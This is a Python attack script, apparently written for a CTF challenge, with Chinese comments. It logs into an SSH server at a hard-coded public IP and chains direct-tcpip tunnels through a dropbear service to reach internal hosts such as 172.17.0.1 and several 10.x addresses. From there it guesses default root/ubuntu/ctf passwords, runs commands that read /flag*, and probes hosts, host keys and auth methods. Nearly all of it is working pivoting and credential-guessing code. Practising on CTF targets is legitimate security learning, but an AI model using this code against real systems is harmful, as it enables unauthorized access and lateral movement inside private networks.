#!/usr/bin/env python3
"""
关键发现：第二层dropbear可以转发到172.17.0.1！
让我们深入探索这个路径
"""

import paramiko
import socket
import time

HOST = "61.147.171.105"
PORT = 55300

def deep_nested_exploration():
    """
    深入探索嵌套连接
    """
    print("=" * 70)
    print("[*] 深入嵌套连接探索")
    print("=" * 70)
    
    # 第一层
    client1 = paramiko.SSHClient()
    client1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client1.connect(HOST, PORT, "ctf", "123456")
    transport1 = client1.get_transport()
    print("第一层连接成功")
    
    # 第二层 - 到localhost
    print("\n[1] 建立第二层（到localhost/dropbear）...")
    chan1 = transport1.open_channel("direct-tcpip", ("localhost", 22), ("127.0.0.1", 0))
    transport2 = paramiko.Transport(chan1)
    transport2.start_client()
    transport2.auth_password("ctf", "123456")
    print("  第二层认证成功")
    
    # 第三层 - 从第二层direct-tcpip到172.17.0.1
    print("\n[2] 从第二层转发到172.17.0.1...")
    chan2 = transport2.open_channel("direct-tcpip", ("172.17.0.1", 22), ("127.0.0.1", 0))
    
    # 创建第三层SSH
    transport3 = paramiko.Transport(chan2)
    transport3.start_client()
    
    print(f"  第三层服务器版本: {transport3.remote_version}")
    key3 = transport3.get_remote_server_key()
    print(f"  第三层Host Key: {key3.get_fingerprint().hex()}")
    
    # 尝试认证
    print("\n[3] 尝试第三层认证...")
    
    # 测试不同的用户名和密码
    creds = [
        ("ctf", "123456"),
        ("root", "123456"),
        ("ubuntu", "123456"),
        ("ctf", ""),
        ("root", ""),
        ("ubuntu", ""),
        ("ctf", "password"),
        ("root", "root"),
    ]
    
    for user, pwd in creds:
        try:
            # 每次需要新的transport
            chan = transport2.open_channel("direct-tcpip", ("172.17.0.1", 22), ("127.0.0.1", 0))
            t = paramiko.Transport(chan)
            t.start_client()
            t.auth_password(user, pwd)
            
            print(f"  [!!!] {user}:{pwd} 成功!")
            
            # 执行命令
            session = t.open_channel("session")
            session.exec_command("id; hostname; cat /flag* 2>/dev/null; ls -la /")
            time.sleep(1)
            output = session.recv(4096).decode()
            print(f"  输出: {output[:500]}")
            
            t.close()
            break
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            if "Auth" not in str(e):
                print(f"  {user}:{pwd} - 错误: {e}")
    
    transport3.close()
    transport2.close()
    client1.close()

def test_three_layer_with_different_targets():
    """
    测试三层连接到不同目标
    """
    print("\n" + "=" * 70)
    print("[*] 三层连接到不同目标")
    print("=" * 70)
    
    # 第一层
    client1 = paramiko.SSHClient()
    client1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client1.connect(HOST, PORT, "ctf", "123456")
    transport1 = client1.get_transport()
    
    # 第二层 - 到localhost
    chan1 = transport1.open_channel("direct-tcpip", ("localhost", 22), ("127.0.0.1", 0))
    transport2 = paramiko.Transport(chan1)
    transport2.start_client()
    transport2.auth_password("ctf", "123456")
    print("第二层建立成功")
    
    # 测试从第二层能访问哪些主机
    targets = [
        ("172.17.0.1", 22),   # Ubuntu主机
        ("10.42.0.1", 22),    # 另一个IP
        ("10.30.49.12", 22),  # Agent
        ("10.30.49.14", 22),  # Agent
        ("localhost", 22),    # 再次到localhost
        ("127.0.0.1", 22),
    ]
    
    print("\n从第二层测试可达目标:")
    for host, port in targets:
        try:
            chan = transport2.open_channel("direct-tcpip", (host, port), ("127.0.0.1", 0))
            chan.settimeout(3)
            banner = chan.recv(1024).decode()
            
            # 获取host key
            chan2 = transport2.open_channel("direct-tcpip", (host, port), ("127.0.0.1", 0))
            t = paramiko.Transport(chan2)
            t.start_client()
            key = t.get_remote_server_key()
            fingerprint = key.get_fingerprint().hex()
            
            print(f"  [+] {host}:{port}")
            print(f"      Banner: {banner[:40].strip()}")
            print(f"      Host Key: {fingerprint}")
            
            t.close()
            chan.close()
        except Exception as e:
            print(f"  [-] {host}:{port} - {e}")
    
    transport2.close()
    client1.close()

def test_recursive_localhost():
    """
    测试：递归连接到localhost会发生什么？
    
    第一层 -> localhost -> localhost -> localhost -> ...
    """
    print("\n" + "=" * 70)
    print("[*] 递归localhost连接测试")
    print("=" * 70)
    
    client1 = paramiko.SSHClient()
    client1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client1.connect(HOST, PORT, "ctf", "123456")
    transport1 = client1.get_transport()
    
    transports = [transport1]
    fingerprints = []
    
    # 获取第一层的fingerprint
    key1 = transport1.get_remote_server_key()
    fingerprints.append(key1.get_fingerprint().hex())
    print(f"第1层 Host Key: {fingerprints[-1]}")
    
    # 尝试多层嵌套
    for layer in range(2, 6):
        try:
            prev_transport = transports[-1]
            chan = prev_transport.open_channel("direct-tcpip", ("localhost", 22), ("127.0.0.1", 0))
            
            new_transport = paramiko.Transport(chan)
            new_transport.start_client()
            
            key = new_transport.get_remote_server_key()
            fingerprints.append(key.get_fingerprint().hex())
            print(f"第{layer}层 Host Key: {fingerprints[-1]}")
            
            # 认证
            new_transport.auth_password("ctf", "123456")
            print(f"第{layer}层 认证成功")
            
            transports.append(new_transport)
            
        except Exception as e:
            print(f"第{layer}层 失败: {e}")
            break
    
    # 检查最深层能否访问172.17.0.1
    if len(transports) > 1:
        print(f"\n从第{len(transports)}层尝试访问172.17.0.1...")
        try:
            deepest = transports[-1]
            chan = deepest.open_channel("direct-tcpip", ("172.17.0.1", 22), ("127.0.0.1", 0))
            chan.settimeout(3)
            banner = chan.recv(1024).decode()
            print(f"  Banner: {banner[:50].strip()}")
            chan.close()
        except Exception as e:
            print(f"  错误: {e}")
    
    # 清理
    for t in reversed(transports[1:]):
        try:
            t.close()
        except:
            pass
    client1.close()

def analyze_hostkey_chain():
    """
    分析Host Key链
    
    如果localhost被fake到dropbear，那么：
    - 第一层dropbear的host key = X
    - 通过direct-tcpip连到localhost，host key应该还是X
    - 但通过direct-tcpip连到172.17.0.1，host key应该是Y（真实Ubuntu）
    
    如果使用user@host格式，dropbear会怎么处理host key？
    """
    print("\n" + "=" * 70)
    print("[*] Host Key链分析")
    print("=" * 70)
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, "ctf", "123456")
    transport = client.get_transport()
    
    direct_key = transport.get_remote_server_key()
    print(f"直接连接 Host Key: {direct_key.get_fingerprint().hex()}")
    
    # 通过direct-tcpip测试
    test_hosts = [
        ("localhost", 22),
        ("127.0.0.1", 22),
        ("172.17.0.1", 22),
        ("10.42.0.1", 22),
    ]
    
    for host, port in test_hosts:
        try:
            chan = transport.open_channel("direct-tcpip", (host, port), ("127.0.0.1", 0))
            t = paramiko.Transport(chan)
            t.start_client()
            key = t.get_remote_server_key()
            fingerprint = key.get_fingerprint().hex()
            version = t.remote_version
            print(f"{host:20} Host Key: {fingerprint} ({version[:30]})")
            t.close()
        except Exception as e:
            print(f"{host:20} 错误: {e}")
    
    client.close()

def try_publickey_auth():
    """
    尝试公钥认证
    
    如果dropbear转发时不传递密码，而是需要公钥认证，
    我们需要看看是否能生成/使用密钥
    """
    print("\n" + "=" * 70)
    print("[*] 公钥认证测试")
    print("=" * 70)
    
    from paramiko import RSAKey, DSSKey, ECDSAKey, Ed25519Key
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, "ctf", "123456")
    transport = client.get_transport()
    
    # 连接到172.17.0.1
    print("\n测试172.17.0.1支持的认证方式...")
    chan = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ("127.0.0.1", 0))
    inner = paramiko.Transport(chan)
    inner.start_client()
    
    # 使用none认证获取支持的方法
    try:
        inner.auth_none("ctf")
    except paramiko.BadAuthenticationType as e:
        print(f"  支持的认证方式: {e.allowed_types}")
    
    inner.close()
    client.close()

if __name__ == "__main__":
    # deep_nested_exploration()
    test_three_layer_with_different_targets()
    test_recursive_localhost()
    analyze_hostkey_chain()
    try_publickey_auth()
